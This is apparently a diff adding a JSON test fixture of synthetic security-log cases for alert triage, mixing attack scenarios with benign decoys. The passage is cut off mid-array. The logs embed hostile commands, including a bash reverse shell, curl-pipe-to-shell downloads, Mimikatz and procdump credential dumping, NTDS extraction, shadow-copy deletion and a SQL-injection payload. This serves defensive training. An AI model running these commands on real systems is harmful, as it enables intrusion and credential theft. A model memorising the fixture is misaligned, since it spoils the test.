@@ -1,0 +1,286 @@
+[
+  {
+    "id": "CASE-001-WEB-DMZ",
+    "target": "WEB-BO-01",
+    "events": [
+      {"src": "syslog", "host": "WEB-BO-01", "ts": "May 10 13:41:02", "proc": "sshd[8123]", "msg": "Failed password for root from 185.220.101.4 port 44213 ssh2", "repeat": 25, "ts_step": 9},
+      {"src": "syslog", "host": "WEB-BO-01", "ts": "May 10 13:45:20", "proc": "sshd[8441]", "msg": "Accepted password for deploy from 185.220.101.4 port 51220 ssh2"},
+      {"src": "syslog", "host": "WEB-BO-01", "ts": "May 10 13:45:44", "proc": "sudo", "msg": "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"},
+      {"src": "bash", "host": "WEB-BO-01", "user": "deploy", "ts": 1778420744, "cmd": "nmap -sS -Pn 10.20.0.0/24 -oG /tmp/.scan.txt"},
+      {"src": "bash", "host": "WEB-BO-01", "user": "deploy", "ts": 1778420900, "cmd": "curl -s http://45.83.221.30:8080/x.sh -o /tmp/x.sh && chmod +x /tmp/x.sh"},
+      {"src": "ids", "ts": "05/10-13:41:20.113042", "sig": "1:2001219", "msg": "ET SCAN Potential SSH Scan", "cls": "Attempted Information Leak", "pr": 2, "proto": "TCP", "source_ip": "185.220.101.4", "sport": 44213, "dest_ip": "10.20.1.10", "dport": 22},
+      {"src": "asa", "ts": "May 10 13:41:20", "msg_id": "106023", "msg": "Deny tcp src outside:185.220.101.4/44213 dst inside:10.20.1.10/22 by access-group \"outside_access_in\""},
+      {"src": "zeek_conn", "uid": "C1a7f", "ts": 1778420744.2, "orig_h": "10.20.1.10", "orig_p": 50122, "resp_h": "45.83.221.30", "resp_p": 8080, "orig_bytes": 218, "resp_bytes": 1240, "state": "SF"}
+    ]
+  },
+  {
+    "id": "CASE-002-FILE-SERVER",
+    "target": "FILE-BO-01",
+    "events": [
+      {"src": "win", "host": "FILE-BO-01", "ts": "2026-05-10T02:14:51.221Z", "event_id": 4625, "channel": "Security", "data": {"TargetUserName": "svc_backup", "LogonType": "10", "IpAddress": "91.240.118.172", "Status": "0xc000006d"}, "repeat": 6, "ts_step": 11},
+      {"src": "win", "host": "FILE-BO-01", "ts": "2026-05-10T02:16:03.744Z", "event_id": 4624, "channel": "Security", "data": {"TargetUserName": "svc_backup", "LogonType": "10", "IpAddress": "91.240.118.172", "LogonProcessName": "NtLmSsp"}},
+      {"src": "win", "host": "FILE-BO-01", "ts": "2026-05-10T02:21:19.008Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet"}},
+      {"src": "win", "host": "FILE-BO-01", "ts": "2026-05-10T02:24:02.512Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "NewProcessName": "C:\\Windows\\System32\\tar.exe", "CommandLine": "tar -czf C:\\Windows\\Temp\\fin.7z C:\\Shares\\Finance"}},
+      {"src": "ecar", "host": "FILE-BO-01", "ts_ms": 1778409821000, "id": "ecar-002-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\cmd.exe", "objectID": "C:\\Windows\\System32\\vssadmin.exe", "pid": 4412, "ppid": 2210, "principal": "NORTHSTAR\\svc_backup", "props": {"command_line": "vssadmin delete shadows /all /quiet", "integrity_level": "High"}},
+      {"src": "ids", "ts": "05/10-02:14:40.550117", "sig": "1:2017577", "msg": "ET SCAN RDP Bruteforce Attempt", "cls": "Attempted Administrator Privilege Gain", "pr": 2, "proto": "TCP", "source_ip": "91.240.118.172", "sport": 61120, "dest_ip": "10.20.2.20", "dport": 3389},
+      {"src": "asa", "ts": "May 10 02:14:40", "msg_id": "106023", "msg": "Deny tcp src outside:91.240.118.172/61120 dst inside:10.20.2.20/3389 by access-group \"outside_access_in\""}
+    ]
+  },
+  {
+    "id": "CASE-003-ADMIN-WS",
+    "target": "WS-NKAPOOR-01",
+    "events": [
+      {"src": "ecar", "host": "WS-NKAPOOR-01", "ts_ms": 1778422500000, "id": "ecar-003-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\wbem\\wmiprvse.exe", "objectID": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 7304, "ppid": 1988, "principal": "NORTHSTAR\\nkapoor", "props": {"command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA", "integrity_level": "Medium"}},
+      {"src": "win", "host": "WS-NKAPOOR-01", "ts": "2026-05-10T15:03:11.902Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Windows\\System32\\wbem\\wmiprvse.exe", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"}},
+      {"src": "zeek_conn", "uid": "C3bk{i}", "ts": 1778422560.0, "orig_h": "10.20.3.44", "orig_p": 50110, "resp_h": "45.83.221.30", "resp_p": 443, "orig_bytes": 412, "resp_bytes": 88, "state": "SF", "repeat": 12, "ts_step": 60, "port_step": 1}
+    ]
+  },
+  {
+    "id": "CASE-004-RED-HERRING",
+    "target": "WS-VHALE-01",
+    "events": [
+      {"src": "win", "host": "WS-VHALE-01", "ts": "2026-05-10T08:32:11.101Z", "event_id": 4776, "channel": "Security", "data": {"TargetUserName": "vhales", "Workstation": "WS-VHALE-01", "Status": "0xc000006a"}, "repeat": 2, "ts_step": 4},
+      {"src": "win", "host": "WS-VHALE-01", "ts": "2026-05-10T08:33:02.771Z", "event_id": 4624, "channel": "Security", "data": {"TargetUserName": "vhales", "LogonType": "2", "LogonProcessName": "User32"}},
+      {"src": "ecar", "host": "WS-VHALE-01", "ts_ms": 1778402082000, "id": "ecar-004-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\userinit.exe", "objectID": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "pid": 5120, "ppid": 4420, "principal": "NORTHSTAR\\vhales", "props": {"command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""}}
+    ]
+  },
+  {
+    "id": "CASE-005-EXT-SCANNER",
+    "target": "45.83.220.5",
+    "events": [
+      {"src": "ids", "ts": "05/10-13:58:33.901257", "sig": "1:2024364", "msg": "ET SCAN Nikto Web App Scan", "cls": "Web Application Attack", "pr": 1, "proto": "TCP", "source_ip": "45.83.220.5", "sport": 49811, "dest_ip": "10.20.1.10", "dport": 443, "repeat": 4, "ts_step": 2, "port_step": 1},
+      {"src": "web", "host": "WEB-BO-01", "ts": "10/May/2026:13:58:31 -0400", "ip": "45.83.220.5", "method": "GET", "path": "/phpmyadmin/", "status": 404, "ua": "Mozilla/5.00 (Nikto/2.5.0)", "bytes": 233, "repeat": 5, "ts_step": 1},
+      {"src": "asa", "ts": "May 10 13:58:31", "msg_id": "106023", "msg": "Deny tcp src outside:45.83.220.5/49811 dst inside:10.20.1.10/443 by access-group \"outside_access_in\"", "repeat": 4, "ts_step": 2}
+    ]
+  },
+  {
+    "id": "CASE-006-EXT-C2",
+    "target": "45.83.221.30",
+    "events": [
+      {"src": "zeek_conn", "uid": "C6c2-{i}", "ts": 1778422560.0, "orig_h": "10.20.3.44", "orig_p": 50110, "resp_h": "45.83.221.30", "resp_p": 443, "orig_bytes": 412, "resp_bytes": 88, "state": "SF", "repeat": 20, "ts_step": 60, "port_step": 1},
+      {"src": "zeek_conn", "uid": "C6w1-{i}", "ts": 1778422800.0, "orig_h": "10.20.1.10", "orig_p": 51110, "resp_h": "45.83.221.30", "resp_p": 8080, "orig_bytes": 218, "resp_bytes": 1240, "state": "SF", "repeat": 3, "ts_step": 120, "port_step": 1}
+    ]
+  },
+  {
+    "id": "CASE-007-EXT-VPN",
+    "target": "198.51.100.77",
+    "events": [
+      {"src": "asa", "ts": "May 10 08:12:04", "msg_id": "113004", "msg": "Group <DfltGrpPolicy> User <vhales> IP <198.51.100.77> Failed VPN user authentication", "repeat": 2, "ts_step": 45},
+      {"src": "ids", "ts": "05/10-08:12:10.004211", "sig": "1:2002406", "msg": "ET POLICY VPN Authentication Failure", "cls": "Potential Corporate Privacy Violation", "pr": 3, "proto": "TCP", "source_ip": "198.51.100.77", "sport": 51022, "dest_ip": "10.20.0.5", "dport": 443}
+    ]
+  },
+  {
+    "id": "CASE-008-DOMAIN-CONTROLLER",
+    "target": "DC-BO-01",
+    "events": [
+      {"src": "ecar", "host": "DC-BO-01", "ts_ms": 1778419800000, "id": "ecar-008-01", "object": "PROCESS", "action": "ACCESS", "actorID": "C:\\Users\\Public\\m.exe", "objectID": "C:\\Windows\\System32\\lsass.exe", "pid": 6112, "ppid": 1, "principal": "NORTHSTAR\\jbiros", "props": {"command_line": "m.exe \"sekurlsa::logonpasswords\" exit", "granted_access": "0x1010"}},
+      {"src": "win", "host": "DC-BO-01", "ts": "2026-05-10T03:30:02.418Z", "event_id": 4624, "channel": "Security", "data": {"TargetUserName": "jbiros", "LogonType": "3", "IpAddress": "10.20.3.70", "AuthenticationPackageName": "NTLM"}},
+      {"src": "win", "host": "DC-BO-01", "ts": "2026-05-10T03:30:02.905Z", "event_id": 4672, "channel": "Security", "data": {"SubjectUserName": "jbiros", "Privileges": "SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege"}},
+      {"src": "win", "host": "DC-BO-01", "ts": "2026-05-10T03:34:44.010Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "NewProcessName": "C:\\Windows\\System32\\ntdsutil.exe", "CommandLine": "ntdsutil \"ac i ntds\" ifm create full C:\\Windows\\Temp\\ntds"}}
+    ]
+  },
+  {
+    "id": "CASE-009-SQL-SERVER",
+    "target": "SQL-BO-01",
+    "events": [
+      {"src": "ids", "ts": "05/10-11:02:14.771002", "sig": "1:2009899", "msg": "ET EXPLOIT MS SQL Server xp_cmdshell Attempt", "cls": "Attempted Administrator Privilege Gain", "pr": 1, "proto": "TCP", "source_ip": "10.20.3.62", "sport": 52011, "dest_ip": "10.20.2.30", "dport": 1433},
+      {"src": "win", "host": "SQL-BO-01", "ts": "2026-05-10T11:02:19.220Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe", "NewProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami /priv & echo net user svc_sql P@ssw0rd2026! /add"}},
+      {"src": "win", "host": "SQL-BO-01", "ts": "2026-05-10T11:04:41.559Z", "event_id": 4720, "channel": "Security", "data": {"TargetUserName": "svc_sql", "SubjectUserName": "SYSTEM"}},
+      {"src": "syslog", "host": "SQL-BO-01", "ts": "May 10 11:02:20", "proc": "sqlservr[1812]", "msg": "Login failed for user 'sa'. Reason: password mismatch"}
+    ]
+  },
+  {
+    "id": "CASE-010-HR-WS",
+    "target": "WS-LCHEN-01",
+    "events": [
+      {"src": "ecar", "host": "WS-LCHEN-01", "ts_ms": 1778411400000, "id": "ecar-010-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "objectID": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 6612, "ppid": 5590, "principal": "NORTHSTAR\\lchen", "props": {"command_line": "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsbGllbnQpLkRvd25sb2FkRmlsZSg="}},
+      {"src": "zeek_http", "uid": "C10h1", "ts": 1778411405.2, "orig_h": "10.20.3.62", "orig_p": 50332, "resp_h": "193.32.162.44", "resp_p": 80, "method": "GET", "vh": "cdn-update-center.net", "uri": "/update.bin", "ua": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)", "status": 200},
+      {"src": "zeek_conn", "uid": "C10h1", "ts": 1778411405.2, "orig_h": "10.20.3.62", "orig_p": 50332, "resp_h": "193.32.162.44", "resp_p": 80, "orig_bytes": 288, "resp_bytes": 184320, "state": "SF"},
+      {"src": "win", "host": "WS-LCHEN-01", "ts": "2026-05-10T08:30:00.710Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsbGllbnQpLkRvd25sb2FkRmlsZSg="}}
+    ]
+  },
+  {
+    "id": "CASE-011-MAIL-GW",
+    "target": "MAIL-BO-01",
+    "events": [
+      {"src": "syslog", "host": "MAIL-BO-01", "ts": "May 10 04:02:11", "proc": "postfix/smtp[3321]", "msg": "connect to mx01.example.net[45.155.205.233]:25: relay accepted", "repeat": 30, "ts_step": 12},
+      {"src": "zeek_conn", "uid": "C11m{i}", "ts": 1778392931.0, "orig_h": "10.20.9.25", "orig_p": 40010, "resp_h": "45.155.205.233", "resp_p": 25, "orig_bytes": 61440, "resp_bytes": 2100, "state": "SF", "repeat": 25, "ts_step": 12, "port_step": 1},
+      {"src": "ids", "ts": "05/10-04:02:15.001122", "sig": "1:2003068", "msg": "ET SPAM Internal Host Sending Bulk Mail", "cls": "Attempted Denial of Service", "pr": 2, "proto": "TCP", "source_ip": "10.20.9.25", "sport": 40001, "dest_ip": "45.155.205.233", "dport": 25}
+    ]
+  },
+  {
+    "id": "CASE-012-BACKUP-SRV",
+    "target": "BKUP-BO-01",
+    "events": [
+      {"src": "win", "host": "BKUP-BO-01", "ts": "2026-05-10T01:10:02.310Z", "event_id": 4720, "channel": "Security", "data": {"TargetUserName": "svc_upd", "SubjectUserName": "BKUP-BO-01$"}},
+      {"src": "win", "host": "BKUP-BO-01", "ts": "2026-05-10T01:10:04.881Z", "event_id": 4732, "channel": "Security", "data": {"TargetUserName": "svc_upd", "GroupName": "Administrators"}},
+      {"src": "win", "host": "BKUP-BO-01", "ts": "2026-05-10T01:11:40.007Z", "event_id": 4698, "channel": "Security", "data": {"TaskName": "\\Updater\\SysSync", "TaskContent": "C:\\Windows\\Temp\\sync.exe --quiet"}},
+      {"src": "ecar", "host": "BKUP-BO-01", "ts_ms": 1778390504000, "id": "ecar-012-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\services.exe", "objectID": "C:\\Windows\\Temp\\sync.exe", "pid": 8820, "ppid": 640, "principal": "NT AUTHORITY\\SYSTEM", "props": {"command_line": "sync.exe --quiet", "signature": "unsigned"}}
+    ]
+  },
+  {
+    "id": "CASE-013-FIN-WS",
+    "target": "WS-JDIAZ-01",
+    "events": [
+      {"src": "ecar", "host": "WS-JDIAZ-01", "ts_ms": 1778412600000, "id": "ecar-013-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Users\\jdiaz\\AppData\\Roaming\\svc.exe", "objectID": "C:\\Users\\Public\\procdump64.exe", "pid": 9912, "ppid": 7710, "principal": "NORTHSTAR\\jdiaz", "props": {"command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"}},
+      {"src": "win", "host": "WS-JDIAZ-01", "ts": "2026-05-10T09:30:00.442Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Users\\jdiaz\\AppData\\Roaming\\svc.exe", "NewProcessName": "C:\\Users\\Public\\procdump64.exe", "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"}},
+      {"src": "zeek_conn", "uid": "C13x1", "ts": 1778412700.0, "orig_h": "10.20.3.70", "orig_p": 52002, "resp_h": "45.83.221.30", "resp_p": 8443, "orig_bytes": 1228800, "resp_bytes": 512, "state": "SF"}
+    ]
+  },
+  {
+    "id": "CASE-014-LINUX-APP",
+    "target": "APP-BO-02",
+    "events": [
+      {"src": "syslog", "host": "APP-BO-02", "ts": "May 10 12:01:10", "proc": "sshd[4402]", "msg": "Failed password for invalid user admin from 45.83.221.30 port 41192 ssh2", "repeat": 12, "ts_step": 6},
+      {"src": "syslog", "host": "APP-BO-02", "ts": "May 10 12:03:02", "proc": "sshd[4588]", "msg": "Accepted password for ubuntu from 45.83.221.30 port 41220 ssh2"},
+      {"src": "bash", "host": "APP-BO-02", "user": "ubuntu", "ts": 1778414582, "cmd": "/bin/bash -i >& /dev/tcp/45.83.221.30/4444 0>&1"},
+      {"src": "bash", "host": "APP-BO-02", "user": "ubuntu", "ts": 1778414700, "cmd": "curl -s http://45.83.221.30:8080/lin.sh | sh"},
+      {"src": "web", "host": "APP-BO-02", "ts": "10/May/2026:12:00:44 -0400", "ip": "45.83.221.30", "method": "POST", "path": "/upload.php", "status": 200, "ua": "curl/8.5.0", "bytes": 9124},
+      {"src": "ids", "ts": "05/10-12:00:46.113007", "sig": "1:2026207", "msg": "ET WEB_SERVER Possible Webshell Upload Attempt", "cls": "Web Application Attack", "pr": 1, "proto": "TCP", "source_ip": "45.83.221.30", "sport": 41192, "dest_ip": "10.20.1.22", "dport": 80},
+      {"src": "zeek_conn", "uid": "C14r1", "ts": 1778414585.0, "orig_h": "10.20.1.22", "orig_p": 44102, "resp_h": "45.83.221.30", "resp_p": 4444, "orig_bytes": 512, "resp_bytes": 240, "state": "SF"}
+    ]
+  },
+  {
+    "id": "CASE-015-EXT-SSH-BRUTE",
+    "target": "185.220.101.4",
+    "events": [
+      {"src": "syslog", "host": "WEB-BO-02", "ts": "May 10 13:38:00", "proc": "sshd[7712]", "msg": "Failed password for root from 185.220.101.4 port 44100 ssh2", "repeat": 35, "ts_step": 7},
+      {"src": "ids", "ts": "05/10-13:38:05.220441", "sig": "1:2001219", "msg": "ET SCAN SSH Brute Force Password Guessing", "cls": "Attempted Information Leak", "pr": 2, "proto": "TCP", "source_ip": "185.220.101.4", "sport": 44100, "dest_ip": "10.20.1.11", "dport": 22, "repeat": 3, "ts_step": 60},
+      {"src": "asa", "ts": "May 10 13:38:05", "msg_id": "106023", "msg": "Deny tcp src outside:185.220.101.4/44100 dst inside:10.20.1.11/22 by access-group \"outside_access_in\"", "repeat": 5, "ts_step": 7}
+    ]
+  },
+  {
+    "id": "CASE-016-EXT-SQLI",
+    "target": "103.152.90.14",
+    "events": [
+      {"src": "ids", "ts": "05/10-16:20:11.008771", "sig": "1:2019804", "msg": "ET WEB_SERVER SQL Injection Attempt UNION SELECT", "cls": "Web Application Attack", "pr": 1, "proto": "TCP", "source_ip": "103.152.90.14", "sport": 55120, "dest_ip": "10.20.1.11", "dport": 443, "repeat": 4, "ts_step": 3},
+      {"src": "web", "host": "WEB-BO-02", "ts": "10/May/2026:16:20:10 -0400", "ip": "103.152.90.14", "method": "GET", "path": "/api/claims?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "status": 500, "ua": "sqlmap/1.8.2#stable (https://sqlmap.org)", "bytes": 421, "repeat": 3, "ts_step": 4}
+    ]
+  },
+  {
+    "id": "CASE-017-EXT-WEBSHELL",
+    "target": "194.26.29.88",
+    "events": [
+      {"src": "web", "host": "WEB-BO-02", "ts": "10/May/2026:18:44:02 -0400", "ip": "194.26.29.88", "method": "POST", "path": "/wp-content/uploads/2026/05/shell.php", "status": 200, "ua": "Mozilla/5.0 (X11; Linux x86_64)", "bytes": 2214},
+      {"src": "ids", "ts": "05/10-18:44:03.114220", "sig": "1:2026207", "msg": "ET WEB_SERVER PHP Webshell Upload Attempt", "cls": "Web Application Attack", "pr": 1, "proto": "TCP", "source_ip": "194.26.29.88", "sport": 51220, "dest_ip": "10.20.1.11", "dport": 80},
+      {"src": "zeek_http", "uid": "C17w1", "ts": 1778438642.0, "orig_h": "194.26.29.88", "orig_p": 51220, "resp_h": "10.20.1.11", "resp_p": 80, "method": "POST", "vh": "claims.northstar-branch.local", "uri": "/wp-content/uploads/2026/05/shell.php", "ua": "Mozilla/5.0 (X11; Linux x86_64)", "status": 200}
+    ]
+  },
+  {
+    "id": "CASE-018-EXT-CRED-STUFFING",
+    "target": "91.240.118.172",
+    "events": [
+      {"src": "win", "host": "FILE-BO-01", "ts": "2026-05-10T02:10:00.111Z", "event_id": 4625, "channel": "Security", "data": {"TargetUserName": "administrator", "LogonType": "10", "IpAddress": "91.240.118.172", "Status": "0xc000006d"}, "repeat": 9, "ts_step": 20},
+      {"src": "ids", "ts": "05/10-02:10:05.552001", "sig": "1:2017577", "msg": "ET SCAN RDP Bruteforce Attempt", "cls": "Attempted Administrator Privilege Gain", "pr": 2, "proto": "TCP", "source_ip": "91.240.118.172", "sport": 61000, "dest_ip": "10.20.2.20", "dport": 3389, "repeat": 5, "ts_step": 25}
+    ]
+  },
+  {
+    "id": "CASE-019-EXT-MALWARE-CDN",
+    "target": "193.32.162.44",
+    "events": [
+      {"src": "zeek_http", "uid": "C19m1", "ts": 1778411405.2, "orig_h": "10.20.3.62", "orig_p": 50332, "resp_h": "193.32.162.44", "resp_p": 80, "method": "GET", "vh": "cdn-update-center.net", "uri": "/update.bin", "ua": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)", "status": 200},
+      {"src": "zeek_conn", "uid": "C19m1", "ts": 1778411405.2, "orig_h": "10.20.3.62", "orig_p": 50332, "resp_h": "193.32.162.44", "resp_p": 80, "orig_bytes": 288, "resp_bytes": 184320, "state": "SF"},
+      {"src": "ids", "ts": "05/10-08:30:05.309881", "sig": "1:2027865", "msg": "ET MALWARE Win32/Emotet Loader Download", "cls": "A Network Trojan was detected", "pr": 1, "proto": "TCP", "source_ip": "10.20.3.62", "sport": 50332, "dest_ip": "193.32.162.44", "dport": 80}
+    ]
+  },
+  {
+    "id": "CASE-020-EXT-PORTSCAN",
+    "target": "80.94.95.226",
+    "events": [
+      {"src": "asa", "ts": "May 10 19:02:11", "msg_id": "106023", "msg": "Deny tcp src outside:80.94.95.226/49001 dst inside:10.20.0.10/445 by access-group \"outside_access_in\"", "repeat": 15, "ts_step": 3},
+      {"src": "ids", "ts": "05/10-19:02:14.881002", "sig": "1:2002911", "msg": "ET SCAN Potential VNC Scan 5900-5920", "cls": "Attempted Information Leak", "pr": 2, "proto": "TCP", "source_ip": "80.94.95.226", "sport": 49001, "dest_ip": "10.20.0.10", "dport": 5900, "repeat": 3, "ts_step": 3}
+    ]
+  },
+  {
+    "id": "CASE-021-EXT-RDP-BRUTE",
+    "target": "222.186.42.7",
+    "events": [
+      {"src": "win", "host": "WS-AMORGAN-01", "ts": "2026-05-10T05:41:00.220Z", "event_id": 4625, "channel": "Security", "data": {"TargetUserName": "amorgan", "LogonType": "3", "IpAddress": "222.186.42.7", "Status": "0xc000006d"}, "repeat": 8, "ts_step": 15},
+      {"src": "ids", "ts": "05/10-05:41:03.112001", "sig": "1:2017577", "msg": "ET SCAN RDP Bruteforce Attempt", "cls": "Attempted Administrator Privilege Gain", "pr": 2, "proto": "TCP", "source_ip": "222.186.42.7", "sport": 58811, "dest_ip": "10.20.3.91", "dport": 3389, "repeat": 4, "ts_step": 30}
+    ]
+  },
+  {
+    "id": "CASE-022-BENIGN-MICROSOFT-IP",
+    "target": "40.97.128.10",
+    "events": [
+      {"src": "ids", "ts": "05/10-09:12:04.001220", "sig": "1:2028764", "msg": "ET INFO Microsoft 365 Sign-in from Microsoft Owned Range", "cls": "Not Suspicious Traffic", "pr": 4, "proto": "TCP", "source_ip": "40.97.128.10", "sport": 443, "dest_ip": "10.20.3.80", "dport": 51220},
+      {"src": "zeek_conn", "uid": "C22m1", "ts": 1778404324.0, "orig_h": "10.20.3.80", "orig_p": 51220, "resp_h": "40.97.128.10", "resp_p": 443, "orig_bytes": 2104, "resp_bytes": 88210, "state": "SF"}
+    ]
+  },
+  {
+    "id": "CASE-023-BENIGN-BACKUP-INTERNAL",
+    "target": "10.20.4.15",
+    "events": [
+      {"src": "zeek_conn", "uid": "C23b{i}", "ts": 1778407200.0, "orig_h": "10.20.4.15", "orig_p": 44510, "resp_h": "10.20.2.20", "resp_p": 445, "orig_bytes": 41943040, "resp_bytes": 2048, "state": "SF", "repeat": 4, "ts_step": 3600, "port_step": 1},
+      {"src": "win", "host": "BKUP-BO-01", "ts": "2026-05-10T09:00:00.001Z", "event_id": 4624, "channel": "Security", "data": {"TargetUserName": "svc_backup_agent", "LogonType": "3", "IpAddress": "10.20.4.15"}}
+    ]
+  },
+  {
+    "id": "CASE-024-BENIGN-UPDATES",
+    "target": "WS-DPATEL-01",
+    "events": [
+      {"src": "ecar", "host": "WS-DPATEL-01", "ts_ms": 1778407200000, "id": "ecar-024-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\services.exe", "objectID": "C:\\Windows\\System32\\svchost.exe", "pid": 2204, "ppid": 640, "principal": "NT AUTHORITY\\SYSTEM", "props": {"command_line": "svchost.exe -k netsvcs -p -s wuauserv"}},
+      {"src": "zeek_conn", "uid": "C24u{i}", "ts": 1778407300.0, "orig_h": "10.20.3.80", "orig_p": 49010, "resp_h": "13.107.42.14", "resp_p": 443, "orig_bytes": 40212, "resp_bytes": 331022, "state": "SF", "repeat": 6, "ts_step": 90, "port_step": 1},
+      {"src": "win", "host": "WS-DPATEL-01", "ts": "2026-05-10T08:41:40.220Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Windows\\System32\\svchost.exe", "NewProcessName": "C:\\Windows\\System32\\wuauclt.exe", "CommandLine": "wuauclt.exe /UpdateDeploymentProvider UpdateDeploymentProvider.dll"}}
+    ]
+  },
+  {
+    "id": "CASE-025-BENIGN-INTERNAL-SCANNER",
+    "target": "SCAN-BO-01",
+    "events": [
+      {"src": "syslog", "host": "SCAN-BO-01", "ts": "May 10 02:00:01", "proc": "nessusd[1180]", "msg": "scheduled scan 'Weekly Baseline' started by policy owner secops"},
+      {"src": "ecar", "host": "SCAN-BO-01", "ts_ms": 1778403601000, "id": "ecar-025-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\services.exe", "objectID": "C:\\Program Files\\Tenable\\Nessus\\nessusd.exe", "pid": 1180, "ppid": 640, "principal": "NT AUTHORITY\\SYSTEM", "props": {"command_line": "nessusd.exe --service"}},
+      {"src": "ids", "ts": "05/10-02:01:12.001221", "sig": "1:2000537", "msg": "ET SCAN Nessus User-Agent Detected", "cls": "Attempted Information Leak", "pr": 3, "proto": "TCP", "source_ip": "10.20.0.40", "sport": 52110, "dest_ip": "10.20.1.10", "dport": 443, "repeat": 3, "ts_step": 40}
+    ]
+  },
+  {
+    "id": "CASE-026-BENIGN-ADMIN-SSH",
+    "target": "WEB-BO-02",
+    "events": [
+      {"src": "syslog", "host": "WEB-BO-02", "ts": "May 10 10:02:01", "proc": "sshd[5521]", "msg": "Accepted password for ops from 10.20.9.5 port 52110 ssh2"},
+      {"src": "syslog", "host": "WEB-BO-02", "ts": "May 10 10:03:12", "proc": "sudo", "msg": "ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/systemctl status nginx"},
+      {"src": "bash", "host": "WEB-BO-02", "user": "ops", "ts": 1778407400, "cmd": "systemctl status nginx"},
+      {"src": "bash", "host": "WEB-BO-02", "user": "ops", "ts": 1778407460, "cmd": "tail -n 50 /var/log/nginx/error.log"}
+    ]
+  },
+  {
+    "id": "CASE-027-BENIGN-DNS",
+    "target": "DNS-BO-01",
+    "events": [
+      {"src": "syslog", "host": "DNS-BO-01", "ts": "May 10 10:11:02", "proc": "named[903]", "msg": "client 10.20.3.80#52111: query: outlook.office365.com IN A + (10.20.3.80)"},
+      {"src": "zeek_conn", "uid": "C27d{i}", "ts": 1778407860.0, "orig_h": "10.20.0.53", "orig_p": 41200, "resp_h": "8.8.8.8", "resp_p": 53, "orig_bytes": 64, "resp_bytes": 128, "state": "SF", "repeat": 5, "ts_step": 30, "port_step": 1}
+    ]
+  },
+  {
+    "id": "CASE-028-BENIGN-NO-EVIDENCE",
+    "target": "203.0.113.77",
+    "events": []
+  },
+  {
+    "id": "CASE-029-BENIGN-RDP-ADMIN",
+    "target": "WS-AMORGAN-01",
+    "events": [
+      {"src": "win", "host": "WS-AMORGAN-01", "ts": "2026-05-10T14:22:11.902Z", "event_id": 4624, "channel": "Security", "data": {"TargetUserName": "amorgan", "LogonType": "10", "IpAddress": "10.20.9.5", "LogonProcessName": "User32"}},
+      {"src": "win", "host": "WS-AMORGAN-01", "ts": "2026-05-10T14:23:40.011Z", "event_id": 4688, "channel": "Security", "data": {"ParentProcessName": "C:\\Windows\\System32\\cmd.exe", "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe", "CommandLine": "ipconfig /all"}},
+      {"src": "ecar", "host": "WS-AMORGAN-01", "ts_ms": 1778423020000, "id": "ecar-029-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\rdpclip.exe", "objectID": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "pid": 8810, "ppid": 4020, "principal": "NORTHSTAR\\amorgan", "props": {"command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" Q1-forecast.xlsx"}}
+    ]
+  },
+  {
+    "id": "CASE-030-BENIGN-FILE-SHARE",
+    "target": "WS-MTAYLOR-01",
+    "events": [
+      {"src": "win", "host": "WS-MTAYLOR-01", "ts": "2026-05-10T15:04:00.221Z", "event_id": 5140, "channel": "Security", "data": {"ShareName": "\\\\FILE-BO-01\\Finance", "SubjectUserName": "mtaylor", "IpAddress": "10.20.3.90"}},
